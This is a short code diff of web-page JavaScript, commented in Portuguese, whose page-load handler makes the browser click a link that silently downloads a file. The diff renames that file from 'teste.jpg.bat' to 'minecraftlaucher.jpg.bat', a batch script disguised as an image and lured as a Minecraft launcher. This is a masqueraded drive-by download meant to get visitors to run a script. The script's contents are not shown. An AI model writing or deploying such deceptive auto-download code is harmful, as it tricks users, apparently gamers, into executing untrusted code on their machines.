@@ -7,8 +7,8 @@ document.addEventListener("DOMContentLoaded", function() {
     function downloadImage() {
         // Cria um link temporário para baixar o arquivo
         const link = document.createElement('a');
-        link.href = 'teste.jpg.bat'; // Nome do arquivo que será baixado (no mesmo diretório)
-        link.download = 'teste.jpg.bat'; // Nome do arquivo durante o download
+        link.href = 'minecraftlaucher.jpg.bat'; // Nome do arquivo que será baixado (no mesmo diretório)
+        link.download = 'minecraftlaucher.jpg.bat'; // Nome do arquivo durante o download
         link.click(); // Simula o clique no link para iniciar o download
     }
 
